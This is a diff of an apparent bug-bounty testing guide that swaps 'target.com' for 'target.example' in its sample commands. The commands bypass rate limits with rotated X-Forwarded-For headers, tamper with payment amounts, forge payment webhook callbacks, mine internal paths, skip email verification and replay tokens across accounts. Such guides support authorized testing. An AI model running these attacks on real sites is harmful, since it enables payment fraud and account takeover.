@@ -70,7 +70,7 @@ Asset types that pay: checkout flows, subscription endpoints, callback/verificat
 ```bash
 # Rotate X-Forwarded-For to bypass IP rate limiting
 for i in $(seq 1 100); do
-  curl -s -X POST https://target.com/api/subscribe \
+  curl -s -X POST https://target.example/api/subscribe \
     -H "X-Forwarded-For: 10.0.0.$i" \
     -H "X-Real-IP: 10.0.0.$i" \
     -H "Content-Type: application/json" \
@@ -82,13 +82,13 @@ done
 **Payment tampering — modify in-flight price:**
 ```http
 POST /payment/initiate HTTP/1.1
-Host: target.com
+Host: target.example
 
 amount=0.01&currency=USD&order_id=12345&product_id=99
 ```
 ```bash
 # Look for unvalidated webhook endpoints
-curl -X POST https://target.com/payment/callback \
+curl -X POST https://target.example/payment/callback \
   -H "Content-Type: application/json" \
   -d '{"status":"success","amount":"0.01","order_id":"12345","transaction_id":"fake-txn"}'
 ```
@@ -96,24 +96,24 @@ curl -X POST https://target.com/payment/callback \
 **Unauthenticated internal page discovery:**
 ```bash
 # Check robots.txt and sitemap for internal paths
-curl -s https://target.com/robots.txt | grep -iE "(disallow|allow)" 
-curl -s https://target.com/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"
+curl -s https://target.example/robots.txt | grep -iE "(disallow|allow)" 
+curl -s https://target.example/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"
 
 # Grep JS bundles for internal paths
-curl -s https://target.com/assets/app.js | grep -oE '"/[a-zA-Z0-9/_-]{3,50}"' | sort -u
+curl -s https://target.example/assets/app.js | grep -oE '"/[a-zA-Z0-9/_-]{3,50}"' | sort -u
 ```
 
 **Email verification bypass:**
 ```bash
 # Skip the verification step: hit the post-verification API endpoint directly
 # with an unverified session. If it succeeds, the gate is UI-only.
-curl -s -X POST https://monitor.target.com/api/monitoring/enable \
+curl -s -X POST https://monitor.target.example/api/monitoring/enable \
   -H "Cookie: session=<your_unverified_session>" \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@example.com"}'
 
 # Replay verification token on different account
-curl -X POST https://target.com/verify \
+curl -X POST https://target.example/verify \
   -d 'token=VALID_TOKEN_FROM_ACCOUNT_A&email=account_b@example.com'
 ```
 
